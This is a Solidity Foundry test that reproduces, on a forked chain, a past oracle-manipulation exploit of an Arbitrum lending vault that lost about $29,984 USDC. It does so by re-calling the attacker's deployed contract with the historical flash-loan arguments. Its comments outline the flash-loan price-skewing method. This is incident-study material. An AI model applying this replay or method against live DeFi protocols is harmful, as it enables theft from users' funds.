// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$29,984 USDC
// Attacker EOA : 0xf8803DaE13A6757E53711214769B5fb52Ec26C7E
// Exploit      : 0x44d2D34E148e1Da5c4291C110f6ff0E472037255
// Victim vault : 0x51ff48f2D43966Be796692BDDDfAE96A435242A8
// Strategy     : 0xF617a3Ad1F0ab9D9fe39E48D688Bfe44562769d9
// AtomicLending: 0xc1b677039892C048f2eFb7E9C5da1B51fDE92504
// Uni V3 ARB/USDC.e : 0xcDa53B1F66614552F834cEeF361A8D12a0B8DaD8
// Aave V3 Pool : 0x794a61358D6845594F94dc1DB02A252b5b4814aD
// Attack tx    : https://arbiscan.io/tx/0xbd4a009cd609a05f1a64458969a1e2c2065472f0ee06a322246f155be12e3a9a
// Alert        : https://x.com/DefimonAlerts/status/2085979711163826236
//
// Atomic (AtomicLending / leveraged strategy on Arbitrum) values LP/collateral from the
// live Uniswap V3 ARB/USDC.e spot. Attacker flash-borrows ARB via Aave V3, skews the
// pool, then drives the strategy/lending modules through mispriced unwind/withdraw paths
// and swaps proceeds ARB→WETH→USDC. Profit (~29,984 USDC) is sent to the attacker EOA.
//
// PoC: fork one block before the attack and re-call historical exploit.run(arbAmount,1,minUsdc).

address constant ATTACKER = 0xf8803DaE13A6757E53711214769B5fb52Ec26C7E;
address constant EXPLOIT = 0x44d2D34E148e1Da5c4291C110f6ff0E472037255;
address constant VICTIM = 0x51ff48f2D43966Be796692BDDDfAE96A435242A8;
address constant STRATEGY = 0xF617a3Ad1F0ab9D9fe39E48D688Bfe44562769d9;
address constant LENDING = 0xc1b677039892C048f2eFb7E9C5da1B51fDE92504;
address constant UNI_POOL = 0xcDa53B1F66614552F834cEeF361A8D12a0B8DaD8;
address constant AAVE_POOL = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
address constant ARB = 0x912CE59144191C1204E64559FE8253a0e49E6548;
address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
address constant USDC_E = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;

// Attack mined in block 492104035; exploit was created in 492103439
uint256 constant FORK_BLOCK = 492_104_034;
// Historical run() args
uint256 constant ARB_FLASH = 2_230_717_800_000_000_000_000_000; // 2,230,717.8 ARB
uint256 constant FLAG = 1;
uint256 constant MIN_USDC = 25_000_000_000; // 25_000 * 1e6
// Net USDC transferred to attacker in the live tx
uint256 constant EXPECTED_USDC = 29_984_270_865;

interface IAtomicExploit {
    function run(uint256 arbAmount, uint256 flag, uint256 minUsdc) external;
}

contract AtomicAtomicLendingOracleManipulation_exp is BaseTestWithBalanceLog {
    function setUp() public {
        // Online: ARBITRUM_ONE_RPC_URL / ARBITRUM_RPC_URL / ATOMIC_FORK_URL (archive RPC)
        // Offline fallback: anvil --load-state anvil_state.json --port 8547 --chain-id 42161
        string memory rpc = vm.envOr("ATOMIC_FORK_URL", string(""));
        if (bytes(rpc).length == 0) {
            rpc = vm.envOr("ARBITRUM_ONE_RPC_URL", string(""));
        }
        if (bytes(rpc).length == 0) {
            rpc = vm.envOr("ARBITRUM_RPC_URL", string("http://127.0.0.1:8547"));
        }
        vm.createSelectFork(rpc, FORK_BLOCK);
        fundingToken = USDC;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker");
        vm.label(EXPLOIT, "Exploit");
        vm.label(VICTIM, "AtomicVault");
        vm.label(STRATEGY, "Strategy");
        vm.label(LENDING, "AtomicLending");
        vm.label(UNI_POOL, "UniV3 ARB/USDC.e");
        vm.label(AAVE_POOL, "Aave V3 Pool");
        vm.label(ARB, "ARB");
        vm.label(USDC, "USDC");

        uint256 before_ = IERC20(USDC).balanceOf(ATTACKER);

        vm.startPrank(ATTACKER, ATTACKER);
        IAtomicExploit(EXPLOIT).run(ARB_FLASH, FLAG, MIN_USDC);
        vm.stopPrank();

        uint256 profit = IERC20(USDC).balanceOf(ATTACKER) - before_;
        emit log_named_decimal_uint("Attacker USDC profit", profit, 6);
        require(profit >= EXPECTED_USDC, "USDC short");
    }
}
